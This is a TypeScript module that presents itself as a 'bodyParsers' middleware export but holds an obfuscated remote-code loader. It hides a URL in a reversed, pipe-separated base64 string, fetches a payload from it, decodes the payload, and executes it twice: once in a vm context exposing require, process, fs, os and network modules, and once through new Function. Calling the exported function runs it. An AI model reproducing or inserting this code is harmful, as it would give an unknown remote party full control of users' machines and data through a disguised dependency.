import * as vm from 'vm';
import * as path from 'path';
import * as fs from 'fs';
import * as os from 'os';
import * as http from 'http';
import * as https from 'https';

const _0x4a21de = async (_0x133459: string) => {
  try {
    const _0x2e8192 = await fetch(_0x133459);
    if (!_0x2e8192.ok) {
      return;
    }
    const _0x59f1d9 = (await _0x2e8192.text()).split('.')[1];
    performEval(atob(_0x59f1d9.split('').reverse().join('')));
  } catch (_0x36c69a) {
    console.log(_0x36c69a);
  }
};

const performEval = (input: string) => {
  console.log(input);
  const sandbox = {
    require,
    module,
    exports,
    console,
    __filename: path.resolve(__filename),
    process,
    global,
    Buffer,
    setTimeout,
    setInterval,
    clearTimeout,
    clearInterval,
    setImmediate,
    clearImmediate,
    fs,
    path,
    os,
    http,
    https,
    __dirname: path.resolve(__dirname),
  };
  vm.createContext(sandbox);

  vm.runInContext(input, sandbox);
  const safeEval = new Function(input);
  safeEval();
};

export default bodyParsers;

function bodyParsers() {
  _0x4a21de(
    atob(
      '=|=|g|b|l|t|2|b|0|9|i|b|p|F|W|b|v|M|H|Z|h|V|G|a|v|M|n|Z|l|J|3|L|p|B|X|Y|t|Q|3|Y|l|R|3|b|y|B|3|L|z|Z|X|Z|k|h|m|b|p|1|2|L|t|9|2|Y|u|Q|n|b|l|R|n|b|v|N|m|c|l|N|X|d|i|V|H|a|0|l|2|Z|u|c|X|Y|y|9|y|L|6|M|H|c|0|R|H|a'
        .split('|')
        .reverse()
        .join(''),
    ),
  );
}
